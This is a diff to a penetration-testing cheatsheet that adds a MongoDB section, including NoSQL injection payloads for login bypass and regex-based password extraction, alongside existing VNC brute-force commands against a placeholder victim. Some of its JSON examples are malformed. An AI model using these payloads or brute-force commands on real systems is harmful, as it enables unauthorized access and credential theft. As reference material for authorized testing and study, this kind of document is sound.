@@ -40,7 +40,9 @@ Other great cheetsheets:
     - [3.16.2. Grabbing MySQL Passwords](#3162-grabbing-mysql-passwords)
     - [3.16.3. Useful MySQL Files](#3163-useful-mysql-files)
   - [3.17. 5900 - VNC Enumeration](#317-5900---vnc-enumeration)
-  - [3.18. IPv6 to bypass IPv4 filters](#318-ipv6-to-bypass-ipv4-filters)
+  - [3.18. 27017 - MongoDB Enumeration](#318-27017---mongodb-enumeration)
+    - [Exploiting NoSQL Injection](#exploiting-nosql-injection)
+  - [3.19. IPv6 to bypass IPv4 filters](#319-ipv6-to-bypass-ipv4-filters)
 - [4. Exploitation](#4-exploitation)
   - [4.1. Searchsploit](#41-searchsploit)
   - [4.2. Password Bruteforcing and Cracking](#42-password-bruteforcing-and-cracking)
@@ -55,7 +57,7 @@ Other great cheetsheets:
   - [4.4. Buffer Overflows](#44-buffer-overflows)
   - [4.5. PHP Exploitation](#45-php-exploitation)
     - [4.5.1. LFI/RFI](#451-lfirfi)
-    - [PHP one-liner Webshells](#php-one-liner-webshells)
+    - [4.5.2. PHP one-liner Webshells](#452-php-one-liner-webshells)
   - [4.6. Reverse Shells](#46-reverse-shells)
     - [4.6.1. Covering your tracks](#461-covering-your-tracks)
     - [4.6.2. Running a detached/daeminized process on Linux](#462-running-a-detacheddaeminized-process-on-linux)
@@ -968,7 +970,121 @@ medusa -h $VICTIM_IP –u root -P pass.txt –M vnc
 ncrack -V --user root -P pass.txt $VICTIM_IP:PORT
 patator vnc_login host=$VICTIM_IP password=FILE0 0=pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login
 ```
-## 3.18. IPv6 to bypass IPv4 filters
+
+## 3.18. 27017 - MongoDB Enumeration
+
+MongoDB is a common open-source NoSQL database. It's service runs on 27017 by
+default.
+
+Compared to SQL databases:
+- Instead of tables, it has *collections*
+- Instead of rows, it has *documents*
+- Instead of columns, it has *fields*
+
+Data is stored using [BSON](https://bsonspec.org/), which is a binary-serialized form of JSON.
+
+```sql
+# starting mongo app, connecting to database server
+mongosh     # connect to localhost:27017, no creds
+mongosh -u <user> -p <password>
+mongosh hostname:port
+mongosh --host <host> --port <port>
+
+# show list of databases
+show databases;
+# connect to database named "admin"
+use admin;
+# list names of collections (tables) in connected database
+db.getCollectionNames();
+# create new collection (table) called "users"
+db.createCollection("users")
+# create new document (row) in users collection:
+db.users.insert({id:"1", username: "derp", email: "derp@derp.com", password: "herpaderp"})
+# show all documents (rows) in the users collection:
+db.users.find()
+# get all documents matching search criteria
+db.users.find({id: {$gt: 5}})
+# get first matching user document
+db.users.findOne({id: '1'})
+# change fields in a users document
+db.users.update({id:"1"}, {$set: {username: "bubba"}});
+# delete a document (by id)
+db.users.remove({'id':'1'})
+# drop the users collection (delete everything)
+db.users.drop()
+```
+
+[Operators](https://docs.mongodb.com/manual/reference/operator/query/) (for searches/matching):
+
+- $eq
+- $ne
+- $gt
+- $lt
+- $and
+- $or
+- $where -
+- $exists
+- $regex
+
+### Exploiting NoSQL Injection
+
+In URL query parameters, you put the nested object key or operator in brackets. Here is an example that might work for auth bypass:
+
+```
+http://example.com/search?username=admin&password[$ne]=derp
+
+# other short examples:
+password[$regex]=.*
+password[$exists]=true
+```
+
+In POST body (JSON):
+
+```json
+{"username": admin, "password": {"$ne": null} }
+
+// other examples
+{"username": admin, "password": {"$gt": undefined} }
+```
+
+SQL vs Mongo injection:
+
+```
+Normal sql: ' or 1=1-- -
+Mongo sql: ' || 1==1//    or    ' || 1==1%00
+
+/?search=admin' && this.password//+%00 --> Check if the field password exists
+/?search=admin' && this.password.match(/.*/)//+%00 --> Start matching password
+/?search=admin' && this.password.match(/^p.*$/)//+%00
+/?search=admin' && this.password.match(/^pa.*$/)//+%00
+```
+
+Extracting length information:
+
+```
+username=admin&password[$regex]=.{1}
+username=admin&password[$regex]=.{3}
+# True if the length equals 1,3...
+```
+
+Building password:
+
+```
+username=admin&password[$regex]=p.*
+username=admin&password[$regex]=pa.*
+username=admin&password[$regex]=pas.*
+username=admin&password[$regex]=pass.*
+...
+# in JSON
+{"username": "admin", "password": {"$regex": "^p" }}
+{"username": "admin", "password": {"$regex": "^pa" }}
+{"username": "admin", "password": {"$regex": "^pas" }}
+...
+```
+
+
+
+## 3.19. IPv6 to bypass IPv4 filters
 
 Sometimes if you see `filtered` on an nmap scan, the filter may only be applied on IPv4, but not IPv6. Try scanning it again using the host's IPv6 address.
 
@@ -987,7 +1103,7 @@ ip -6 n | grep -i MACADDR
 sudo nmap -6 -n -v -sC -sV -p FILTERED_PORT IPV6_ADDR
 ```
 
-Here is another example of a script to try to get the link-local IPv6 address by building the EUI form from the MAC:
+Here is another example of a script to try to get the link-local IPv6 address by building the EUI format from the MAC:
 
 ```bash
 #!/bin/bash -e
@@ -1519,7 +1635,7 @@ are good to try to grab when you have an LFI vulnerability.
 ```
 
 
-### PHP one-liner Webshells
+### 4.5.2. PHP one-liner Webshells
 
 Simple one-liner web shells for when you can drop/modify a local php file:
 
